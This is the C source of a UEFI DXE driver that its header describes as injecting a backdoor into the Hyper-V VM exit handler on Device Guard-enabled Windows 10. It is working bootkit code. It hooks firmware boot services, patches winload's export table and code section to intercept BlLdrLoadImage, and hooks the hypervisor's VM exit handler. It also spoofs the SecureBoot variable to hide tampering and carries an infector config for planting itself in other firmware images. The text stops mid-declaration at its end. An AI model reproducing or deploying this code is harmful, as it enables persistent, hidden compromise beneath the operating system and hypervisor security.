/*
 *********************************************************************
  
  UEFI DXE driver that injects Hyper-V VM exit handler backdoor into 
  the Device Guard enabled Windows 10 Enterprise.
  
  @d_olex

 *********************************************************************
 */

#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SerialIo.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>

#include <IndustryStandard/PeImage.h>

#include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"

#include "../config.h"
#include "../backdoor_client/backdoor_client.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "std.h"
#include "DmaBackdoorHv.h"
#include "HyperV.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

#define MAX_IMAGE_SIZE (1 * 1024 * 1024)

EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
); 

EFI_STATUS
EFIAPI
BackdoorEntryDma(
    EFI_GUID *Protocol, VOID *Registration, VOID **Interface
);

EFI_STATUS 
EFIAPI 
BackdoorEntryInfected(
    EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryDma,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0,

    // *******************************************************

    // address of infector entry point
    (UINT64)&BackdoorEntryInfected,

    // RVA of original entry point
    0
};

VOID *m_ImageBase = NULL;
EFI_SYSTEM_TABLE *m_ST = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;
EFI_RUNTIME_SERVICES *m_RT = NULL;

// debug messages stuff
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
EFI_PHYSICAL_ADDRESS *m_PendingOutputAddr = (EFI_PHYSICAL_ADDRESS *)(DEBUG_OUTPUT_ADDR);
char *m_PendingOutput = NULL;

// winload hook stuff
VOID *m_WinloadBase = NULL;
UINT8 *m_TrampolineAddr = NULL;

// Hyper-V stuff
HYPER_V_INFO m_HvInfo;

// report backdoor status using INFECTOR_STATUS_ADDR and HYPER_V_INFO_ADDR memory regions
BOOLEAN m_bReportStatus = FALSE;

#if defined(BACKDOOR_RUNTIME_HOOKS)

// use EFI_RUNTIME_SERVICES hooks
BOOLEAN m_bUseRuntimeHooks = FALSE;

#endif
//--------------------------------------------------------------------------------------
void ConsolePrintScreen(char *Message)
{    
    if (m_TextOutput)
    {        
        size_t Len = std_strlen(Message), i = 0;

        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }
}

void ConsolePrintBuffer(char *Message)
{
    size_t Len = std_strlen(Message);

    if (m_PendingOutput && std_strlen(m_PendingOutput) + Len < DEBUG_OUTPUT_SIZE)
    {                    
        strcat(m_PendingOutput, Message);
    }
}

void ConsolePrint(char *Message)
{
    // print messages to the screem
    ConsolePrintScreen(Message);

    // save messages to the buffer
    ConsolePrintBuffer(Message);
}
//--------------------------------------------------------------------------------------
void ConsoleInitialize(void)
{
    EFI_STATUS Status = EFI_SUCCESS;
    EFI_PHYSICAL_ADDRESS PagesAddr;

#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        m_ST->ConsoleOutHandle, &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

#endif

    // allocate memory for debug output
    Status = m_BS->AllocatePages(
        AllocateAnyPages, EfiRuntimeServicesData, 
        (DEBUG_OUTPUT_SIZE / PAGE_SIZE), &PagesAddr
    );
    if (Status == EFI_SUCCESS) 
    {
        EFI_GUID VariableGuid = BACKDOOR_VAR_GUID;

        if (m_bReportStatus)
        {
            *m_PendingOutputAddr = PagesAddr;
        }

        m_PendingOutput = (char *)PagesAddr;        
        std_memset(m_PendingOutput, 0, DEBUG_OUTPUT_SIZE);

        // save memory address into the firmware variable
        Status = m_ST->RuntimeServices->SetVariable(
            BACKDOOR_VAR_NAME, &VariableGuid,
            EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_BOOTSERVICE_ACCESS,
            sizeof(PagesAddr), (VOID *)&PagesAddr
        );
        if (EFI_ERROR(Status)) 
        {
            DbgMsg(__FILE__, __LINE__, "SetVariable() fails: 0x%X\r\n", Status);
        }
    }
    else
    {     
        DbgMsg(__FILE__, __LINE__, "AllocatePages() fails: 0x%X\r\n", Status);
    }
}
//--------------------------------------------------------------------------------------
VOID SimpleTextOutProtocolNotifyHandler(EFI_EVENT Event, VOID *Context)
{
    EFI_STATUS Status = EFI_SUCCESS;

    if (m_TextOutput == NULL)
    {
        // initialize console I/O
        Status = m_BS->HandleProtocol(
            m_ST->ConsoleOutHandle,
            &gEfiSimpleTextOutProtocolGuid, 
            (VOID **)&m_TextOutput
        );
        if (Status == EFI_SUCCESS)
        {
            m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
            m_TextOutput->ClearScreen(m_TextOutput);

            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Text output protocol is ready\r\n");
            
            if (m_PendingOutput)
            {                
                // print pending messages
                ConsolePrintScreen(m_PendingOutput);

#if !defined(BACKDOOR_DEBUG_SCREEN)

                m_TextOutput = NULL;
#endif
                m_BS->Stall(TO_MICROSECONDS(3));
            }            
        }        
    }        
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {       
        EFI_IMAGE_DOS_HEADER *pDosHdr = (EFI_IMAGE_DOS_HEADER *)Base; 

        // check for DOS header
        if (pDosHdr->e_magic == EFI_IMAGE_DOS_SIGNATURE &&
            pDosHdr->e_lfanew < 0x100)
        {
            EFI_IMAGE_NT_HEADERS *pNtHdr = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, pDosHdr->e_lfanew);

            // check for NT header
            if (pNtHdr->Signature == EFI_IMAGE_NT_SIGNATURE)
            {
                return Base;
            }
        }

        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *BackdoorImageRealocate(VOID *Image)
{
    EFI_STATUS Status = EFI_SUCCESS;

    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;      

    DbgMsg(
        __FILE__, __LINE__, __FUNCTION__"(): image size = 0x%x\r\n", 
        pHeaders->OptionalHeader.SizeOfImage
    );  

    // allocate memory for executable image
    Status = m_BS->AllocatePages(AllocateAnyPages, EfiRuntimeServicesData, PagesCount, &Addr);
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        std_memcpy(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations acording to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
#define MAX_MODULE_NAME_SIZE 0x100

typedef struct _LDR_DATA_TABLE_ENTRY
{
   LIST_ENTRY InLoadOrderLinks;
   LIST_ENTRY InMemoryOrderLinks;
   LIST_ENTRY InInitializationOrderLinks;
   VOID *DllBase;
   VOID *EntryPoint;
   UINTN SizeOfImage;

} LDR_DATA_TABLE_ENTRY;

typedef UINT64 (__stdcall * func_BlLdrLoadImage)(
    VOID *arg_01, VOID *arg_02, VOID *arg_03, VOID *arg_04, VOID *arg_05, VOID *arg_06, VOID *arg_07, VOID *arg_08, 
    VOID *arg_09, VOID *arg_10, VOID *arg_11, VOID *arg_12, VOID *arg_13, VOID *arg_14, VOID *arg_15, VOID *arg_16
);

func_BlLdrLoadImage old_BlLdrLoadImage = NULL;

UINT64 __stdcall new_BlLdrLoadImage(
    VOID *arg_01, VOID *arg_02, VOID *arg_03, VOID *arg_04, VOID *arg_05, VOID *arg_06, VOID *arg_07, VOID *arg_08, 
    VOID *arg_09, VOID *arg_10, VOID *arg_11, VOID *arg_12, VOID *arg_13, VOID *arg_14, VOID *arg_15, VOID *arg_16)
{
    int Size = 0;    
    char szModulePath[MAX_MODULE_NAME_SIZE];    

    // just for sure
    m_TextOutput = NULL;

    UINT64 Status = old_BlLdrLoadImage(
        arg_01, arg_02, arg_03, arg_04, arg_05, arg_06, arg_07, arg_08, 
        arg_09, arg_10, arg_11, arg_12, arg_13, arg_14, arg_15, arg_16
    );    

    if (arg_02)
    {
        // second argument contains module path
        UINT16 *pPath = (UINT16 *)arg_02;    

        while (*(pPath + Size) != 0 && Size < MAX_MODULE_NAME_SIZE - 1)
        {
            // convert module path form UTF-16 to ACSII
            szModulePath[Size] = *(char *)(pPath + Size);
            Size += 1;
        }

        szModulePath[Size] = '\0';

        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Path = \"%s\"\r\n", szModulePath);
    }

    if (Status == 0)
    {
        if (arg_08)
        {
            LDR_DATA_TABLE_ENTRY *LdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_08;            

            // check for the Hyper-V image
            if (m_HvInfo.ImageBase == NULL && LdrGetProcAddress(LdrEntry->DllBase, "HvImageInfo") != NULL)
            {
                m_HvInfo.Status = BACKDOOR_ERR_HYPER_V_EXIT;
                m_HvInfo.ImageBase = LdrEntry->DllBase;
                m_HvInfo.ImageEntry = LdrEntry->EntryPoint;                                

                // locate and hook VM exit handler
                if ((m_HvInfo.VmExit = HyperVHook(LdrEntry->DllBase)) != NULL)
                {
                    m_HvInfo.Status = BACKDOOR_SUCCESS;
                }
            }
        }
    }

    return Status;
}
//--------------------------------------------------------------------------------------
// original address of hooked function
EFI_OPEN_PROTOCOL old_OpenProtocol = NULL;

// return address to ExitBootServices() caller
UINT64 ret_OpenProtocol = 0;

VOID *FindWinloadImage(UINT64 Addr)
{
    VOID *Image = NULL;
    UINT64 Size = 0;

    // align by page boundary
    Addr &= ~(PAGE_SIZE - 1);

    // determinate winload.dll base address
    for (Size = 0; Size < MAX_IMAGE_SIZE && Addr > 0; Size += 1)
    {
        if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
        {
            Image = (VOID *)Addr;
            break;
        }

        Addr -= PAGE_SIZE;
    }   

    if (Image)
    {
        EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
            Image, ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew);

        // get image exports
        UINT32 ExportAddr = pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (ExportAddr != 0)
        {                    
            EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    

            // check winload image name
            if (std_strcmp((char *)RVATOVA(Image, Export->Name), "BootLib.dll") == 0 ||
                std_strcmp((char *)RVATOVA(Image, Export->Name), "winload.sys") == 0)
            {
                return Image;
            }
        }
    }

    return NULL;
}

EFI_STATUS EFIAPI new_OpenProtocol(
    EFI_HANDLE Handle, 
    EFI_GUID *Protocol, 
    VOID **Interface, 
    EFI_HANDLE AgentHandle, 
    EFI_HANDLE ControllerHandle, 
    UINT32 Attributes)
{
    if (m_WinloadBase == NULL)
    {        
        VOID *WinloadBase = NULL;

        // chcek if OpenProtocol() was called from the winload image
        if ((WinloadBase = FindWinloadImage(ret_OpenProtocol)) != NULL)
        {            
            m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_FUNC;

            // get winload!BlLdrLoadImage() export address
            if ((old_BlLdrLoadImage = (func_BlLdrLoadImage)LdrGetProcAddress(WinloadBase, "BlLdrLoadImage")) != NULL)
            {
                DbgMsg(__FILE__, __LINE__, "winload.dll is at "FPTR"\r\n", WinloadBase);
                DbgMsg(__FILE__, __LINE__, "winload!BlLdrLoadImage() is at "FPTR"\r\n", old_BlLdrLoadImage);   

                m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_HOOK;

                // remove EFI_BOOT_SERVICES.OpenProtocol() hook
                m_BS->OpenProtocol = old_OpenProtocol;  

                m_WinloadBase = WinloadBase;
            }
        }

        if (old_BlLdrLoadImage)
        {
            UINT32 Trampoline = 0, i = 0;            

            EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
                m_WinloadBase, ((EFI_IMAGE_DOS_HEADER *)m_WinloadBase)->e_lfanew);

            EFI_IMAGE_SECTION_HEADER *pSection = (EFI_IMAGE_SECTION_HEADER *)RVATOVA(
                &pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);

            // find code section by name
            for (i = 0; i < pHeaders->FileHeader.NumberOfSections; i += 1, pSection += 1)
            {
                if (std_strcmp((char *)&pSection->Name, ".text") == 0)
                {
                    UINT32 MaxSize = ALIGN_UP(pSection->Misc.VirtualSize, pHeaders->OptionalHeader.SectionAlignment);
                    
                    DbgMsg(
                        __FILE__, __LINE__, "%d free bytes found at the end of the code section at "FPTR"\r\n",
                        MaxSize - pSection->Misc.VirtualSize,
                        RVATOVA(m_WinloadBase, pSection->VirtualAddress + pSection->Misc.VirtualSize)
                    );

                    // check for the free space at the end of the section
                    if (MaxSize - pSection->Misc.VirtualSize > JUMP64_LEN + JUMP32_LEN)
                    {
                        Trampoline = pSection->VirtualAddress + pSection->Misc.VirtualSize;
                    }
                    
                    break;
                }
            }       

            if (Trampoline != 0)
            {
                EFI_IMAGE_EXPORT_DIRECTORY *pExport = NULL;
                
                // get address of winload!BlLdrLoadImage() hook trampoline
                m_TrampolineAddr = RVATOVA(m_WinloadBase, Trampoline);

                // mov rax, new_BlLdrLoadImage
                *(UINT16 *)m_TrampolineAddr = 0xb848;
                *(UINT64 *)(m_TrampolineAddr + 2) = (UINT64)&new_BlLdrLoadImage;

                // jmp rax
                *(UINT16 *)(m_TrampolineAddr + 10) = 0xe0ff;                

                if (pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
                {
                    // get export directory address
                    pExport = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(
                        m_WinloadBase,
                        pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
                    );
                }

                if (pExport)
                {
                    UINT32 *AddressOfFunctions = (UINT32 *)RVATOVA(m_WinloadBase, pExport->AddressOfFunctions);
                    INT16 *AddrOfOrdinals = (INT16 *)RVATOVA(m_WinloadBase, pExport->AddressOfNameOrdinals);
                    UINT32 *AddressOfNames = (UINT32 *)RVATOVA(m_WinloadBase, pExport->AddressOfNames);

                    // locate needed export
                    for (i = 0; i < pExport->NumberOfFunctions; i += 1)
                    {
                        if (std_strcmp((char *)RVATOVA(m_WinloadBase, AddressOfNames[i]), "BlLdrLoadImage") == 0)
                        {
                            DbgMsg(
                                __FILE__, __LINE__, 
                                "winload!BlLdrLoadImage() hook was set, handler is at "FPTR"\r\n",
                                new_BlLdrLoadImage
                            );

                            m_HvInfo.Status = BACKDOOR_ERR_HYPER_V_IMAGE;

                            // patch function RVA
                            AddressOfFunctions[AddrOfOrdinals[i]] = Trampoline;
                            break;
                        }
                    }
                }
            }
        }
    }

    // exit to the original function
    return old_OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);
}
//--------------------------------------------------------------------------------------
#if defined(BACKDOOR_RUNTIME_HOOKS)

#define MAX_VARIABLE_NAME_SIZE 0x100

typedef struct _VARIABLE_DEF
{
    char *Name;
    UINT8 *Data;
    UINTN Size;

} VARIABLE_DEF,
*PVARIABLE_DEF;

// list of the fake EFI variables for GetVariable() hook handler
VARIABLE_DEF m_EmulatedVariables[] =
{
    { "SecureBoot",     "\x01",     1 },
    { NULL,             NULL,       0 },
};

// original address of hooked functions
EFI_GET_VARIABLE old_GetVariable = NULL;
EFI_SET_VIRTUAL_ADDRESS_MAP old_SetVirtualAddressMap = NULL;

EFI_STATUS EFIAPI new_GetVariable(
    CHAR16 *VariableName,
    EFI_GUID *VendorGuid,
    UINT32 *Attributes,
    UINTN *DataSize,
    VOID *Data)
{    
    int Size = 0;    
    char szVariableName[MAX_VARIABLE_NAME_SIZE];    

    if (VariableName && DataSize)
    {        
        while (*(VariableName + Size) != 0 && Size < MAX_VARIABLE_NAME_SIZE - 1)
        {
            // convert variable name form UTF-16 to ACSII
            szVariableName[Size] = *(char *)(VariableName + Size);
            Size += 1;
        }

        szVariableName[Size] = '\0';

        if (Size > 0)
        {
            PVARIABLE_DEF Variable = m_EmulatedVariables;            

            while (Variable->Name != NULL)
            {
                // check if we need to return fake value for this variable
                if (std_strcmp(szVariableName, Variable->Name) == 0)
                {
                    if (*DataSize >= Variable->Size)
                    {
                        if (Data)
                        {
                            DbgMsg(
                                __FILE__, __LINE__, 
                                __FUNCTION__"(): Returning fake value for \"%s\" EFI variable\r\n", 
                                szVariableName
                            );

                            std_memcpy(Data, Variable->Data, Variable->Size);
                        }

                        *DataSize = Variable->Size;
                        return EFI_SUCCESS;
                    }
                    else
                    {                        
                        *DataSize = Variable->Size;                        
                        return EFI_BUFFER_TOO_SMALL;
                    }
                }

                Variable += 1;
            }
        }        
    }

    // call original function
    return old_GetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

EFI_STATUS EFIAPI new_SetVirtualAddressMap(
    UINTN MemoryMapSize,
    UINTN DescriptorSize,
    UINT32 DescriptorVersion,
    EFI_MEMORY_DESCRIPTOR *VirtualMap)
{
    UINTN i = 0;
    EFI_MEMORY_DESCRIPTOR *MapEntry = VirtualMap;        

    /*
        Copy old function address from the global variable because
        image relocations might be reparsed in this function.
    */
    EFI_SET_VIRTUAL_ADDRESS_MAP Func = old_SetVirtualAddressMap;    

    m_TextOutput = NULL;

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");    

    #define FIXUP_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) - Addr + MapEntry->VirtualStart)

    #define CHECK_ADDR(_addr_) ((EFI_PHYSICAL_ADDRESS)(_addr_) >= Addr && \
                                (EFI_PHYSICAL_ADDRESS)(_addr_) < (EFI_PHYSICAL_ADDRESS)RVATOVA(Addr, Len))

    // enumerate virtual memory mappings
    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
    {
        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;

        if (CHECK_ADDR(old_GetVariable))
        {
            // calculate new virtual address of GetVariable()
            old_GetVariable = (EFI_GET_VARIABLE)FIXUP_ADDR(old_GetVariable);
        }

        if (CHECK_ADDR(old_SetVirtualAddressMap))
        {
            // calculate new virtual address of SetVirtualAddressMap()
            old_SetVirtualAddressMap = (EFI_SET_VIRTUAL_ADDRESS_MAP)FIXUP_ADDR(old_SetVirtualAddressMap);
        }
    }

    // enumerate virtual memory mappings
    for (i = 0; i < MemoryMapSize / DescriptorSize; i += 1)
    {
        UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
        EFI_PHYSICAL_ADDRESS Addr = MapEntry->PhysicalStart;

        // check for memory region that contants backdoor image
        if (CHECK_ADDR(m_ImageBase))
        {
            VOID *ImageBaseOld = m_ImageBase;

            // calculate new virtual address of backdoor image
            VOID *ImageBaseNew = (VOID *)FIXUP_ADDR(ImageBaseOld);

            DbgMsg(
                __FILE__, __LINE__, 
                "New address of the resident image is "FPTR"\r\n", ImageBaseNew
            );

            m_ImageBase = ImageBaseNew;

            // update image relocations acording to the new address
            LDR_UPDATE_RELOCS(ImageBaseOld, ImageBaseOld, ImageBaseNew);

            break;
        }

        // go to the next entry
        MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
    }

    // call original function
    return Func(MemoryMapSize, DescriptorSize, DescriptorVersion, VirtualMap);
}

#endif // BACKDOOR_RUNTIME_HOOKS
//--------------------------------------------------------------------------------------
// original address of hooked function
EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;

// return address to ExitBootServices() caller
UINT64 ret_ExitBootServices = 0;

EFI_STATUS EFIAPI new_ExitBootServices(
    EFI_HANDLE ImageHandle,
    UINTN Key)
{    
    PHYPER_V_INFO pHvInfo = (PHYPER_V_INFO)(HYPER_V_INFO_ADDR);

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() called\r\n");    

    switch (m_HvInfo.Status)
    {
    case BACKDOOR_ERR_WINLOAD_IMAGE:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload.efi\r\n");
        break;

    case BACKDOOR_ERR_WINLOAD_FUNC:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!BlLdrLoadImage()\r\n");
        break;

    case BACKDOOR_ERR_WINLOAD_HOOK:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to hook winload!BlLdrLoadImage()\r\n");
        break;

    case BACKDOOR_ERR_HYPER_V_IMAGE:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate Hyper-V image\r\n");
        break;

    case BACKDOOR_ERR_HYPER_V_EXIT:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate Hyper-V VM exit handler\r\n");
        break;

    case BACKDOOR_ERR_UNKNOWN:

        DbgMsg(__FILE__, __LINE__, "ERROR: Unknown error occurred\r\n");
        break;
    }

    // prevent to call DXE services during runtime phase
    m_TextOutput = NULL;

#if defined(BACKDOOR_RUNTIME_HOOKS)

    if (old_GetVariable)
    {
        // remove GetVariable() hook
        m_RT->GetVariable = old_GetVariable;
    }

    if (old_SetVirtualAddressMap)
    {
        // remove SetVirtualAddressMap() hook
        m_RT->SetVirtualAddressMap = old_SetVirtualAddressMap;
    }

#endif

    if (m_bReportStatus)
    {
        // report Hyper-V information
        std_memcpy(pHvInfo, &m_HvInfo, sizeof(HYPER_V_INFO));
    }

    // exit to the original function
    return old_ExitBootServices(ImageHandle, Key);
}
//--------------------------------------------------------------------------------------
typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

EFI_STATUS RegisterProtocolNotifyDxe(
    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
    EFI_EVENT *Event, VOID **Registration)
{
    EFI_STATUS Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
    if (EFI_ERROR(Status)) 
    {
        DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
        return Status;
    }

    Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration);
    if (EFI_ERROR(Status)) 
    {
        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
        return Status;
    }

    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);

    return Status;
}

VOID BackdoorEntryResident(VOID *Image)
{               
    PHYPER_V_INFO pHvInfo = (PHYPER_V_INFO)(HYPER_V_INFO_ADDR);
    PINFECTOR_STATUS pInfectorStatus = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);    

#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)

    VOID *Registration = NULL;
    EFI_EVENT Event = NULL;  

    // set text output protocol register notify
    RegisterProtocolNotifyDxe(
        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
        &Event, &Registration
    );

#endif

    m_ImageBase = Image;        

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    // hook EFI_BOOT_SERVICES.OpenProtocol()
    old_OpenProtocol = m_BS->OpenProtocol;
    m_BS->OpenProtocol = _OpenProtocol;

    // hook EFI_BOOT_SERVICES.ExitBootServices()
    old_ExitBootServices = m_BS->ExitBootServices;
    m_BS->ExitBootServices = _ExitBootServices;     

    DbgMsg(
        __FILE__, __LINE__, "OpenProtocol() hook was set, handler = "FPTR"\r\n",
        _OpenProtocol
    );

    DbgMsg(
        __FILE__, __LINE__, "ExitBootServices() hook was set, handler = "FPTR"\r\n",
        _ExitBootServices
    );  

#if defined(BACKDOOR_RUNTIME_HOOKS)

    if (m_bUseRuntimeHooks)
    {
        // hook GetVariable() runtime function
        old_GetVariable = m_RT->GetVariable;
        m_RT->GetVariable = new_GetVariable;

        // hook SetVirtualAddressMap() runtime function
        old_SetVirtualAddressMap = m_RT->SetVirtualAddressMap;
        m_RT->SetVirtualAddressMap = new_SetVirtualAddressMap;

        DbgMsg(
            __FILE__, __LINE__, "GetVariable() hook was set, handler = "FPTR"\r\n",
            new_GetVariable
        );

        DbgMsg(
            __FILE__, __LINE__, "SetVirtualAddressMap() hook was set, handler = "FPTR"\r\n",
            new_SetVirtualAddressMap
        );
    }

#endif // BACKDOOR_RUNTIME_HOOKS    

    m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_IMAGE;
    m_HvInfo.ImageBase = NULL;
    m_HvInfo.ImageEntry = NULL;
    m_HvInfo.VmExit = NULL;

    if (m_bReportStatus)
    {
        // notify about successful DXE driver execution
        pInfectorStatus->Status = BACKDOOR_SUCCESS;

        // Hyper-V backdoor is not ready yet
        pHvInfo->Status = BACKDOOR_NOT_READY;
    }

#if !defined(BACKDOOR_DEBUG_SCREEN)

    m_TextOutput = NULL;

#endif

}
//--------------------------------------------------------------------------------------
#define SYSTEM_TABLE_START 0x70000000
#define SYSTEM_TABLE_END   0xd0000000

EFI_SYSTEM_TABLE *BackdoorFindSystemTable(void)
{
    UINTN Ptr = 0;

    for (Ptr = SYSTEM_TABLE_START; Ptr < SYSTEM_TABLE_END; Ptr += PAGE_SIZE)
    {
        EFI_SYSTEM_TABLE *SystemTable = (EFI_SYSTEM_TABLE *)Ptr;

        // check for the valid system table header
        if (SystemTable->Hdr.Signature == EFI_SYSTEM_TABLE_SIGNATURE &&
            SystemTable->Hdr.HeaderSize < PAGE_SIZE &&
            SystemTable->Hdr.Revision < (3 << 16) &&
            SystemTable->Hdr.Reserved == 0)
        {
            return SystemTable;
        }
    }

    return NULL;
}

EFI_STATUS EFIAPI BackdoorEntryDma(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    VOID *Base = NULL;
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  
    m_bReportStatus = TRUE;

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    if (LocateProtocol != NULL)
    {
        // remove LocateProtocol() hook
        SystemTable->BootServices->LocateProtocol = LocateProtocol;
    }

    if (SystemTable == NULL)
    {
        // scan memory and find system table address
        SystemTable = BackdoorFindSystemTable();
    }

    if (SystemTable != NULL)
    {
        // call real entry point
        _ModuleEntryPoint(NULL, SystemTable);    
    }

    if (LocateProtocol != NULL)
    {
        // call hooked function
        return LocateProtocol(Protocol, Registration, Interface);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS EFIAPI BackdoorEntryInfected(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
{
    VOID *Base = NULL;
    EFI_LOADED_IMAGE *LoadedImage = NULL;

    // get backdoor image base address
    if ((Base = ImageBaseByAddress(get_addr())) == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

#if defined(BACKDOOR_RUNTIME_HOOKS)

    m_bUseRuntimeHooks = TRUE;

#endif
    
    // call real entry point
    _ModuleEntryPoint(NULL, SystemTable);

    // get current image information
    m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID *)&LoadedImage);  

    if (LoadedImage && m_InfectorConfig.OriginalEntryPoint != 0)
    {
        EFI_IMAGE_ENTRY_POINT Entry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(
            LoadedImage->ImageBase,
            m_InfectorConfig.OriginalEntryPoint
        );

        // call original entry point
        return Entry(ImageHandle, SystemTable);
    }

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
EFI_STATUS 
EFIAPI
